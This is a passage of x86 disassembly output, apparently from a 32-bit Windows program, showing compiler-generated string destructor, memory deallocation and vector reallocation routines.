  40299c:	52                   	push   %edx
  40299d:	51                   	push   %ecx
  40299e:	e8 69 98 00 00       	call   0x40c20c
  4029a3:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4029a6:	83 c4 08             	add    $0x8,%esp
  4029a9:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  4029ac:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  4029b0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4029b3:	83 f8 08             	cmp    $0x8,%eax
  4029b6:	0f 82 a7 fd ff ff    	jb     0x402763
  4029bc:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4029bf:	8d 14 45 02 00 00 00 	lea    0x2(,%eax,2),%edx
  4029c6:	8b c1                	mov    %ecx,%eax
  4029c8:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  4029ce:	72 10                	jb     0x4029e0
  4029d0:	8b 49 fc             	mov    -0x4(%ecx),%ecx
  4029d3:	83 c2 23             	add    $0x23,%edx
  4029d6:	2b c1                	sub    %ecx,%eax
  4029d8:	83 c0 fc             	add    $0xfffffffc,%eax
  4029db:	83 f8 1f             	cmp    $0x1f,%eax
  4029de:	77 15                	ja     0x4029f5
  4029e0:	52                   	push   %edx
  4029e1:	51                   	push   %ecx
  4029e2:	e8 25 98 00 00       	call   0x40c20c
  4029e7:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4029ea:	83 c4 08             	add    $0x8,%esp
  4029ed:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  4029f0:	e9 6e fd ff ff       	jmp    0x402763
  4029f5:	e8 9f d7 00 00       	call   0x410199
  4029fa:	cc                   	int3
  4029fb:	cc                   	int3
  4029fc:	cc                   	int3
  4029fd:	cc                   	int3
  4029fe:	cc                   	int3
  4029ff:	cc                   	int3
  402a00:	56                   	push   %esi
  402a01:	8b f1                	mov    %ecx,%esi
  402a03:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  402a06:	83 f9 08             	cmp    $0x8,%ecx
  402a09:	72 2e                	jb     0x402a39
  402a0b:	8b 46 18             	mov    0x18(%esi),%eax
  402a0e:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  402a15:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402a1b:	72 12                	jb     0x402a2f
  402a1d:	8b 50 fc             	mov    -0x4(%eax),%edx
  402a20:	83 c1 23             	add    $0x23,%ecx
  402a23:	2b c2                	sub    %edx,%eax
  402a25:	83 c0 fc             	add    $0xfffffffc,%eax
  402a28:	83 f8 1f             	cmp    $0x1f,%eax
  402a2b:	77 6a                	ja     0x402a97
  402a2d:	8b c2                	mov    %edx,%eax
  402a2f:	51                   	push   %ecx
  402a30:	50                   	push   %eax
  402a31:	e8 d6 97 00 00       	call   0x40c20c
  402a36:	83 c4 08             	add    $0x8,%esp
  402a39:	33 c0                	xor    %eax,%eax
  402a3b:	c7 46 28 00 00 00 00 	movl   $0x0,0x28(%esi)
  402a42:	c7 46 2c 07 00 00 00 	movl   $0x7,0x2c(%esi)
  402a49:	66 89 46 18          	mov    %ax,0x18(%esi)
  402a4d:	8b 4e 14             	mov    0x14(%esi),%ecx
  402a50:	83 f9 08             	cmp    $0x8,%ecx
  402a53:	72 2d                	jb     0x402a82
  402a55:	8b 06                	mov    (%esi),%eax
  402a57:	8d 0c 4d 02 00 00 00 	lea    0x2(,%ecx,2),%ecx
  402a5e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402a64:	72 12                	jb     0x402a78
  402a66:	8b 50 fc             	mov    -0x4(%eax),%edx
  402a69:	83 c1 23             	add    $0x23,%ecx
  402a6c:	2b c2                	sub    %edx,%eax
  402a6e:	83 c0 fc             	add    $0xfffffffc,%eax
  402a71:	83 f8 1f             	cmp    $0x1f,%eax
  402a74:	77 21                	ja     0x402a97
  402a76:	8b c2                	mov    %edx,%eax
  402a78:	51                   	push   %ecx
  402a79:	50                   	push   %eax
  402a7a:	e8 8d 97 00 00       	call   0x40c20c
  402a7f:	83 c4 08             	add    $0x8,%esp
  402a82:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  402a89:	33 c0                	xor    %eax,%eax
  402a8b:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  402a92:	66 89 06             	mov    %ax,(%esi)
  402a95:	5e                   	pop    %esi
  402a96:	c3                   	ret
  402a97:	e8 fd d6 00 00       	call   0x410199
  402a9c:	cc                   	int3
  402a9d:	cc                   	int3
  402a9e:	cc                   	int3
  402a9f:	cc                   	int3
  402aa0:	e9 2b 00 00 00       	jmp    0x402ad0
  402aa5:	cc                   	int3
  402aa6:	cc                   	int3
  402aa7:	cc                   	int3
  402aa8:	cc                   	int3
  402aa9:	cc                   	int3
  402aaa:	cc                   	int3
  402aab:	cc                   	int3
  402aac:	cc                   	int3
  402aad:	cc                   	int3
  402aae:	cc                   	int3
  402aaf:	cc                   	int3
  402ab0:	e9 9b 00 00 00       	jmp    0x402b50
  402ab5:	cc                   	int3
  402ab6:	cc                   	int3
  402ab7:	cc                   	int3
  402ab8:	cc                   	int3
  402ab9:	cc                   	int3
  402aba:	cc                   	int3
  402abb:	cc                   	int3
  402abc:	cc                   	int3
  402abd:	cc                   	int3
  402abe:	cc                   	int3
  402abf:	cc                   	int3
  402ac0:	8b 01                	mov    (%ecx),%eax
  402ac2:	85 c0                	test   %eax,%eax
  402ac4:	74 07                	je     0x402acd
  402ac6:	50                   	push   %eax
  402ac7:	ff 15 50 10 42 00    	call   *0x421050
  402acd:	c3                   	ret
  402ace:	cc                   	int3
  402acf:	cc                   	int3
  402ad0:	56                   	push   %esi
  402ad1:	57                   	push   %edi
  402ad2:	8b f9                	mov    %ecx,%edi
  402ad4:	8b 37                	mov    (%edi),%esi
  402ad6:	85 f6                	test   %esi,%esi
  402ad8:	74 6c                	je     0x402b46
  402ada:	53                   	push   %ebx
  402adb:	8b 5f 04             	mov    0x4(%edi),%ebx
  402ade:	3b f3                	cmp    %ebx,%esi
  402ae0:	74 10                	je     0x402af2
  402ae2:	8b ce                	mov    %esi,%ecx
  402ae4:	e8 17 ff ff ff       	call   0x402a00
  402ae9:	83 c6 30             	add    $0x30,%esi
  402aec:	3b f3                	cmp    %ebx,%esi
  402aee:	75 f2                	jne    0x402ae2
  402af0:	8b 37                	mov    (%edi),%esi
  402af2:	8b 4f 08             	mov    0x8(%edi),%ecx
  402af5:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402afa:	2b ce                	sub    %esi,%ecx
  402afc:	f7 e9                	imul   %ecx
  402afe:	5b                   	pop    %ebx
  402aff:	c1 fa 03             	sar    $0x3,%edx
  402b02:	8b c2                	mov    %edx,%eax
  402b04:	c1 e8 1f             	shr    $0x1f,%eax
  402b07:	03 c2                	add    %edx,%eax
  402b09:	8d 04 40             	lea    (%eax,%eax,2),%eax
  402b0c:	c1 e0 04             	shl    $0x4,%eax
  402b0f:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402b14:	72 12                	jb     0x402b28
  402b16:	8b 4e fc             	mov    -0x4(%esi),%ecx
  402b19:	83 c0 23             	add    $0x23,%eax
  402b1c:	2b f1                	sub    %ecx,%esi
  402b1e:	83 c6 fc             	add    $0xfffffffc,%esi
  402b21:	83 fe 1f             	cmp    $0x1f,%esi
  402b24:	77 23                	ja     0x402b49
  402b26:	8b f1                	mov    %ecx,%esi
  402b28:	50                   	push   %eax
  402b29:	56                   	push   %esi
  402b2a:	e8 dd 96 00 00       	call   0x40c20c
  402b2f:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  402b35:	83 c4 08             	add    $0x8,%esp
  402b38:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  402b3f:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  402b46:	5f                   	pop    %edi
  402b47:	5e                   	pop    %esi
  402b48:	c3                   	ret
  402b49:	e8 4b d6 00 00       	call   0x410199
  402b4e:	cc                   	int3
  402b4f:	cc                   	int3
  402b50:	56                   	push   %esi
  402b51:	8b f1                	mov    %ecx,%esi
  402b53:	8b 0e                	mov    (%esi),%ecx
  402b55:	85 c9                	test   %ecx,%ecx
  402b57:	74 64                	je     0x402bbd
  402b59:	8b 56 04             	mov    0x4(%esi),%edx
  402b5c:	57                   	push   %edi
  402b5d:	51                   	push   %ecx
  402b5e:	e8 4d 06 00 00       	call   0x4031b0
  402b63:	8b 4e 08             	mov    0x8(%esi),%ecx
  402b66:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402b6b:	8b 3e                	mov    (%esi),%edi
  402b6d:	83 c4 04             	add    $0x4,%esp
  402b70:	2b cf                	sub    %edi,%ecx
  402b72:	f7 e9                	imul   %ecx
  402b74:	c1 fa 02             	sar    $0x2,%edx
  402b77:	8b c2                	mov    %edx,%eax
  402b79:	c1 e8 1f             	shr    $0x1f,%eax
  402b7c:	03 c2                	add    %edx,%eax
  402b7e:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  402b81:	c1 e1 03             	shl    $0x3,%ecx
  402b84:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402b8a:	72 12                	jb     0x402b9e
  402b8c:	8b 57 fc             	mov    -0x4(%edi),%edx
  402b8f:	83 c1 23             	add    $0x23,%ecx
  402b92:	2b fa                	sub    %edx,%edi
  402b94:	8d 47 fc             	lea    -0x4(%edi),%eax
  402b97:	83 f8 1f             	cmp    $0x1f,%eax
  402b9a:	77 23                	ja     0x402bbf
  402b9c:	8b fa                	mov    %edx,%edi
  402b9e:	51                   	push   %ecx
  402b9f:	57                   	push   %edi
  402ba0:	e8 67 96 00 00       	call   0x40c20c
  402ba5:	83 c4 08             	add    $0x8,%esp
  402ba8:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  402bae:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  402bb5:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  402bbc:	5f                   	pop    %edi
  402bbd:	5e                   	pop    %esi
  402bbe:	c3                   	ret
  402bbf:	e8 d5 d5 00 00       	call   0x410199
  402bc4:	cc                   	int3
  402bc5:	cc                   	int3
  402bc6:	cc                   	int3
  402bc7:	cc                   	int3
  402bc8:	cc                   	int3
  402bc9:	cc                   	int3
  402bca:	cc                   	int3
  402bcb:	cc                   	int3
  402bcc:	cc                   	int3
  402bcd:	cc                   	int3
  402bce:	cc                   	int3
  402bcf:	cc                   	int3
  402bd0:	55                   	push   %ebp
  402bd1:	8b ec                	mov    %esp,%ebp
  402bd3:	8b 55 0c             	mov    0xc(%ebp),%edx
  402bd6:	51                   	push   %ecx
  402bd7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402bda:	e8 d1 05 00 00       	call   0x4031b0
  402bdf:	83 c4 04             	add    $0x4,%esp
  402be2:	5d                   	pop    %ebp
  402be3:	c2 08 00             	ret    $0x8
  402be6:	cc                   	int3
  402be7:	cc                   	int3
  402be8:	cc                   	int3
  402be9:	cc                   	int3
  402bea:	cc                   	int3
  402beb:	cc                   	int3
  402bec:	cc                   	int3
  402bed:	cc                   	int3
  402bee:	cc                   	int3
  402bef:	cc                   	int3
  402bf0:	55                   	push   %ebp
  402bf1:	8b ec                	mov    %esp,%ebp
  402bf3:	8b 45 0c             	mov    0xc(%ebp),%eax
  402bf6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402bf9:	8d 14 40             	lea    (%eax,%eax,2),%edx
  402bfc:	c1 e2 03             	shl    $0x3,%edx
  402bff:	81 fa 00 10 00 00    	cmp    $0x1000,%edx
  402c05:	72 14                	jb     0x402c1b
  402c07:	56                   	push   %esi
  402c08:	8b 71 fc             	mov    -0x4(%ecx),%esi
  402c0b:	83 c2 23             	add    $0x23,%edx
  402c0e:	2b ce                	sub    %esi,%ecx
  402c10:	8d 41 fc             	lea    -0x4(%ecx),%eax
  402c13:	83 f8 1f             	cmp    $0x1f,%eax
  402c16:	77 11                	ja     0x402c29
  402c18:	8b ce                	mov    %esi,%ecx
  402c1a:	5e                   	pop    %esi
  402c1b:	52                   	push   %edx
  402c1c:	51                   	push   %ecx
  402c1d:	e8 ea 95 00 00       	call   0x40c20c
  402c22:	83 c4 08             	add    $0x8,%esp
  402c25:	5d                   	pop    %ebp
  402c26:	c2 08 00             	ret    $0x8
  402c29:	e8 6b d5 00 00       	call   0x410199
  402c2e:	cc                   	int3
  402c2f:	cc                   	int3
  402c30:	55                   	push   %ebp
  402c31:	8b ec                	mov    %esp,%ebp
  402c33:	83 ec 18             	sub    $0x18,%esp
  402c36:	8b 45 08             	mov    0x8(%ebp),%eax
  402c39:	8b d0                	mov    %eax,%edx
  402c3b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402c3e:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402c43:	53                   	push   %ebx
  402c44:	8b d9                	mov    %ecx,%ebx
  402c46:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402c49:	56                   	push   %esi
  402c4a:	57                   	push   %edi
  402c4b:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402c4e:	8b 3b                	mov    (%ebx),%edi
  402c50:	2b d7                	sub    %edi,%edx
  402c52:	8b 4b 04             	mov    0x4(%ebx),%ecx
  402c55:	f7 ea                	imul   %edx
  402c57:	2b cf                	sub    %edi,%ecx
  402c59:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  402c5c:	c1 fa 03             	sar    $0x3,%edx
  402c5f:	8b c2                	mov    %edx,%eax
  402c61:	c1 e8 1f             	shr    $0x1f,%eax
  402c64:	03 c2                	add    %edx,%eax
  402c66:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402c69:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402c6e:	f7 e9                	imul   %ecx
  402c70:	c1 fa 03             	sar    $0x3,%edx
  402c73:	8b c2                	mov    %edx,%eax
  402c75:	c1 e8 1f             	shr    $0x1f,%eax
  402c78:	03 c2                	add    %edx,%eax
  402c7a:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402c7d:	3d 55 55 55 05       	cmp    $0x5555555,%eax
  402c82:	0f 84 b8 01 00 00    	je     0x402e40
  402c88:	8b 4b 08             	mov    0x8(%ebx),%ecx
  402c8b:	8d 70 01             	lea    0x1(%eax),%esi
  402c8e:	2b cf                	sub    %edi,%ecx
  402c90:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402c95:	f7 e9                	imul   %ecx
  402c97:	b8 55 55 55 05       	mov    $0x5555555,%eax
  402c9c:	c1 fa 03             	sar    $0x3,%edx
  402c9f:	8b ca                	mov    %edx,%ecx
  402ca1:	c1 e9 1f             	shr    $0x1f,%ecx
  402ca4:	03 ca                	add    %edx,%ecx
  402ca6:	8b d1                	mov    %ecx,%edx
  402ca8:	d1 ea                	shr    $1,%edx
  402caa:	2b c2                	sub    %edx,%eax
  402cac:	3b c8                	cmp    %eax,%ecx
  402cae:	76 04                	jbe    0x402cb4
  402cb0:	8b c6                	mov    %esi,%eax
  402cb2:	eb 08                	jmp    0x402cbc
  402cb4:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  402cb7:	3b c6                	cmp    %esi,%eax
  402cb9:	0f 42 c6             	cmovb  %esi,%eax
  402cbc:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  402cbf:	c1 e1 04             	shl    $0x4,%ecx
  402cc2:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  402cc5:	3d 55 55 55 05       	cmp    $0x5555555,%eax
  402cca:	76 05                	jbe    0x402cd1
  402ccc:	83 c9 ff             	or     $0xffffffff,%ecx
  402ccf:	eb 08                	jmp    0x402cd9
  402cd1:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402cd7:	72 27                	jb     0x402d00
  402cd9:	8d 41 23             	lea    0x23(%ecx),%eax
  402cdc:	83 ca ff             	or     $0xffffffff,%edx
  402cdf:	3b c1                	cmp    %ecx,%eax
  402ce1:	0f 46 c2             	cmovbe %edx,%eax
  402ce4:	50                   	push   %eax
  402ce5:	e8 30 95 00 00       	call   0x40c21a
  402cea:	83 c4 04             	add    $0x4,%esp
  402ced:	85 c0                	test   %eax,%eax
  402cef:	0f 84 46 01 00 00    	je     0x402e3b
  402cf5:	8d 78 23             	lea    0x23(%eax),%edi
  402cf8:	83 e7 e0             	and    $0xffffffe0,%edi
  402cfb:	89 47 fc             	mov    %eax,-0x4(%edi)
  402cfe:	eb 13                	jmp    0x402d13
  402d00:	85 c9                	test   %ecx,%ecx
  402d02:	74 0d                	je     0x402d11
  402d04:	51                   	push   %ecx
  402d05:	e8 10 95 00 00       	call   0x40c21a
  402d0a:	83 c4 04             	add    $0x4,%esp
  402d0d:	8b f8                	mov    %eax,%edi
  402d0f:	eb 02                	jmp    0x402d13
  402d11:	33 ff                	xor    %edi,%edi
  402d13:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402d16:	33 d2                	xor    %edx,%edx
  402d18:	8b 75 f8             	mov    -0x8(%ebp),%esi
  402d1b:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  402d1e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402d21:	c1 e1 04             	shl    $0x4,%ecx
  402d24:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402d27:	c7 44 39 10 00 00 00 	movl   $0x0,0x10(%ecx,%edi,1)
  402d2e:	00 
  402d2f:	c7 44 39 14 00 00 00 	movl   $0x0,0x14(%ecx,%edi,1)
  402d36:	00 
  402d37:	0f 10 00             	movups (%eax),%xmm0
  402d3a:	0f 11 04 39          	movups %xmm0,(%ecx,%edi,1)
  402d3e:	f3 0f 7e 40 10       	movq   0x10(%eax),%xmm0
  402d43:	66 0f d6 44 39 10    	movq   %xmm0,0x10(%ecx,%edi,1)
  402d49:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  402d50:	c7 40 14 07 00 00 00 	movl   $0x7,0x14(%eax)
  402d57:	66 89 10             	mov    %dx,(%eax)
  402d5a:	89 54 39 28          	mov    %edx,0x28(%ecx,%edi,1)
  402d5e:	89 54 39 2c          	mov    %edx,0x2c(%ecx,%edi,1)
  402d62:	0f 10 40 18          	movups 0x18(%eax),%xmm0
  402d66:	0f 11 44 39 18       	movups %xmm0,0x18(%ecx,%edi,1)
  402d6b:	f3 0f 7e 40 28       	movq   0x28(%eax),%xmm0
  402d70:	66 0f d6 44 39 28    	movq   %xmm0,0x28(%ecx,%edi,1)
  402d76:	33 c9                	xor    %ecx,%ecx
  402d78:	89 50 28             	mov    %edx,0x28(%eax)
  402d7b:	c7 40 2c 07 00 00 00 	movl   $0x7,0x2c(%eax)
  402d82:	66 89 48 18          	mov    %cx,0x18(%eax)
  402d86:	8b 0b                	mov    (%ebx),%ecx
  402d88:	8b 53 04             	mov    0x4(%ebx),%edx
  402d8b:	51                   	push   %ecx
  402d8c:	57                   	push   %edi
  402d8d:	3b f2                	cmp    %edx,%esi
  402d8f:	74 18                	je     0x402da9
  402d91:	8b d6                	mov    %esi,%edx
  402d93:	e8 78 05 00 00       	call   0x403310
  402d98:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402d9b:	83 c4 04             	add    $0x4,%esp
  402d9e:	8b 53 04             	mov    0x4(%ebx),%edx
  402da1:	83 c0 30             	add    $0x30,%eax
  402da4:	03 c7                	add    %edi,%eax
  402da6:	8b ce                	mov    %esi,%ecx
  402da8:	50                   	push   %eax
  402da9:	e8 62 05 00 00       	call   0x403310
  402dae:	8b 33                	mov    (%ebx),%esi
  402db0:	83 c4 08             	add    $0x8,%esp
  402db3:	85 f6                	test   %esi,%esi
  402db5:	74 5b                	je     0x402e12
  402db7:	8b 43 04             	mov    0x4(%ebx),%eax
  402dba:	3b f0                	cmp    %eax,%esi
  402dbc:	74 15                	je     0x402dd3
  402dbe:	8b d8                	mov    %eax,%ebx
  402dc0:	8b ce                	mov    %esi,%ecx
  402dc2:	e8 39 fc ff ff       	call   0x402a00
  402dc7:	83 c6 30             	add    $0x30,%esi
  402dca:	3b f3                	cmp    %ebx,%esi
  402dcc:	75 f2                	jne    0x402dc0
  402dce:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  402dd1:	8b 33                	mov    (%ebx),%esi
  402dd3:	8b 4b 08             	mov    0x8(%ebx),%ecx
  402dd6:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402ddb:	2b ce                	sub    %esi,%ecx
  402ddd:	f7 e9                	imul   %ecx
  402ddf:	c1 fa 03             	sar    $0x3,%edx
  402de2:	8b c2                	mov    %edx,%eax
  402de4:	c1 e8 1f             	shr    $0x1f,%eax
  402de7:	03 c2                	add    %edx,%eax
  402de9:	8d 04 40             	lea    (%eax,%eax,2),%eax
  402dec:	c1 e0 04             	shl    $0x4,%eax
  402def:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402df4:	72 12                	jb     0x402e08
  402df6:	8b 4e fc             	mov    -0x4(%esi),%ecx
  402df9:	83 c0 23             	add    $0x23,%eax
  402dfc:	2b f1                	sub    %ecx,%esi
  402dfe:	83 c6 fc             	add    $0xfffffffc,%esi
  402e01:	83 fe 1f             	cmp    $0x1f,%esi
  402e04:	77 35                	ja     0x402e3b
  402e06:	8b f1                	mov    %ecx,%esi
  402e08:	50                   	push   %eax
  402e09:	56                   	push   %esi
  402e0a:	e8 fd 93 00 00       	call   0x40c20c
  402e0f:	83 c4 08             	add    $0x8,%esp
  402e12:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402e15:	89 3b                	mov    %edi,(%ebx)
  402e17:	8d 04 40             	lea    (%eax,%eax,2),%eax
  402e1a:	83 c0 03             	add    $0x3,%eax
  402e1d:	c1 e0 04             	shl    $0x4,%eax
  402e20:	03 c7                	add    %edi,%eax
  402e22:	89 43 04             	mov    %eax,0x4(%ebx)
  402e25:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402e28:	03 c7                	add    %edi,%eax
  402e2a:	89 43 08             	mov    %eax,0x8(%ebx)
  402e2d:	8b 03                	mov    (%ebx),%eax
  402e2f:	03 45 fc             	add    -0x4(%ebp),%eax
  402e32:	5f                   	pop    %edi
  402e33:	5e                   	pop    %esi
  402e34:	5b                   	pop    %ebx
  402e35:	8b e5                	mov    %ebp,%esp
  402e37:	5d                   	pop    %ebp
  402e38:	c2 08 00             	ret    $0x8
  402e3b:	e8 59 d3 00 00       	call   0x410199
  402e40:	e8 8b e7 ff ff       	call   0x4015d0
  402e45:	cc                   	int3
  402e46:	cc                   	int3
  402e47:	cc                   	int3
  402e48:	cc                   	int3
  402e49:	cc                   	int3
  402e4a:	cc                   	int3
  402e4b:	cc                   	int3
  402e4c:	cc                   	int3
  402e4d:	cc                   	int3
  402e4e:	cc                   	int3
  402e4f:	cc                   	int3
  402e50:	55                   	push   %ebp
  402e51:	8b ec                	mov    %esp,%ebp
  402e53:	6a ff                	push   $0xffffffff
  402e55:	68 00 05 42 00       	push   $0x420500
  402e5a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402e60:	50                   	push   %eax
  402e61:	83 ec 24             	sub    $0x24,%esp
  402e64:	53                   	push   %ebx
  402e65:	56                   	push   %esi
  402e66:	57                   	push   %edi
  402e67:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  402e6c:	33 c5                	xor    %ebp,%eax
  402e6e:	50                   	push   %eax
  402e6f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402e72:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  402e78:	89 65 f0             	mov    %esp,-0x10(%ebp)
  402e7b:	8b f9                	mov    %ecx,%edi
  402e7d:	8b 45 08             	mov    0x8(%ebp),%eax
  402e80:	8b d0                	mov    %eax,%edx
  402e82:	8b 37                	mov    (%edi),%esi
  402e84:	2b d6                	sub    %esi,%edx
  402e86:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402e89:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402e8c:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402e91:	f7 ea                	imul   %edx
  402e93:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  402e96:	8b 4f 04             	mov    0x4(%edi),%ecx
  402e99:	c1 fa 02             	sar    $0x2,%edx
  402e9c:	2b ce                	sub    %esi,%ecx
  402e9e:	8b c2                	mov    %edx,%eax
  402ea0:	c1 e8 1f             	shr    $0x1f,%eax
  402ea3:	03 c2                	add    %edx,%eax
  402ea5:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402ea8:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402ead:	f7 e9                	imul   %ecx
  402eaf:	c1 fa 02             	sar    $0x2,%edx
  402eb2:	8b da                	mov    %edx,%ebx
  402eb4:	c1 eb 1f             	shr    $0x1f,%ebx
  402eb7:	03 da                	add    %edx,%ebx
  402eb9:	81 fb aa aa aa 0a    	cmp    $0xaaaaaaa,%ebx
  402ebf:	0f 84 86 01 00 00    	je     0x40304b
  402ec5:	8b 4f 08             	mov    0x8(%edi),%ecx
  402ec8:	b8 ab aa aa 2a       	mov    $0x2aaaaaab,%eax
  402ecd:	2b ce                	sub    %esi,%ecx
  402ecf:	43                   	inc    %ebx
  402ed0:	f7 e9                	imul   %ecx
  402ed2:	b8 aa aa aa 0a       	mov    $0xaaaaaaa,%eax
  402ed7:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  402eda:	c1 fa 02             	sar    $0x2,%edx
  402edd:	8b ca                	mov    %edx,%ecx
  402edf:	c1 e9 1f             	shr    $0x1f,%ecx
  402ee2:	03 ca                	add    %edx,%ecx
  402ee4:	8b d1                	mov    %ecx,%edx
  402ee6:	d1 ea                	shr    $1,%edx
  402ee8:	2b c2                	sub    %edx,%eax
  402eea:	3b c8                	cmp    %eax,%ecx
  402eec:	76 07                	jbe    0x402ef5
  402eee:	8b c3                	mov    %ebx,%eax
  402ef0:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  402ef3:	eb 0b                	jmp    0x402f00
  402ef5:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  402ef8:	3b c3                	cmp    %ebx,%eax
  402efa:	0f 42 c3             	cmovb  %ebx,%eax
  402efd:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402f00:	8d 0c 40             	lea    (%eax,%eax,2),%ecx
  402f03:	c1 e1 03             	shl    $0x3,%ecx
  402f06:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  402f09:	3d aa aa aa 0a       	cmp    $0xaaaaaaa,%eax
  402f0e:	76 05                	jbe    0x402f15
  402f10:	83 c9 ff             	or     $0xffffffff,%ecx
  402f13:	eb 08                	jmp    0x402f1d
  402f15:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402f1b:	72 27                	jb     0x402f44
  402f1d:	8d 41 23             	lea    0x23(%ecx),%eax
  402f20:	83 ca ff             	or     $0xffffffff,%edx
  402f23:	3b c1                	cmp    %ecx,%eax
  402f25:	0f 46 c2             	cmovbe %edx,%eax
  402f28:	50                   	push   %eax
  402f29:	e8 ec 92 00 00       	call   0x40c21a
  402f2e:	83 c4 04             	add    $0x4,%esp
  402f31:	85 c0                	test   %eax,%eax
  402f33:	0f 84 17 01 00 00    	je     0x403050
  402f39:	8d 70 23             	lea    0x23(%eax),%esi
  402f3c:	83 e6 e0             	and    $0xffffffe0,%esi
  402f3f:	89 46 fc             	mov    %eax,-0x4(%esi)
  402f42:	eb 16                	jmp    0x402f5a
  402f44:	85 c9                	test   %ecx,%ecx
  402f46:	74 10                	je     0x402f58
  402f48:	51                   	push   %ecx
  402f49:	e8 cc 92 00 00       	call   0x40c21a
  402f4e:	83 c4 04             	add    $0x4,%esp
  402f51:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402f54:	8b f0                	mov    %eax,%esi
  402f56:	eb 05                	jmp    0x402f5d
  402f58:	33 f6                	xor    %esi,%esi
  402f5a:	89 75 e8             	mov    %esi,-0x18(%ebp)
  402f5d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402f60:	ff 75 dc             	push   -0x24(%ebp)
  402f63:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402f6a:	8d 04 40             	lea    (%eax,%eax,2),%eax
  402f6d:	c1 e0 03             	shl    $0x3,%eax
  402f70:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402f73:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
  402f76:	8d 41 18             	lea    0x18(%ecx),%eax
  402f79:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402f7c:	e8 9f 02 00 00       	call   0x403220
  402f81:	8b 57 04             	mov    0x4(%edi),%edx
  402f84:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402f87:	51                   	push   %ecx
  402f88:	8b 0f                	mov    (%edi),%ecx
  402f8a:	56                   	push   %esi
  402f8b:	3b c2                	cmp    %edx,%eax
  402f8d:	74 13                	je     0x402fa2
  402f8f:	8b d0                	mov    %eax,%edx
  402f91:	e8 fa 03 00 00       	call   0x403390
  402f96:	8b 57 04             	mov    0x4(%edi),%edx
  402f99:	83 c4 04             	add    $0x4,%esp
  402f9c:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402f9f:	ff 75 ec             	push   -0x14(%ebp)
  402fa2:	e8 e9 03 00 00       	call   0x403390
  402fa7:	8b 0f                	mov    (%edi),%ecx
  402fa9:	83 c4 08             	add    $0x8,%esp
  402fac:	85 c9                	test   %ecx,%ecx
  402fae:	74 51                	je     0x403001
  402fb0:	8b 57 04             	mov    0x4(%edi),%edx
  402fb3:	51                   	push   %ecx
  402fb4:	e8 f7 01 00 00       	call   0x4031b0
  402fb9:	8b 4f 08             	mov    0x8(%edi),%ecx
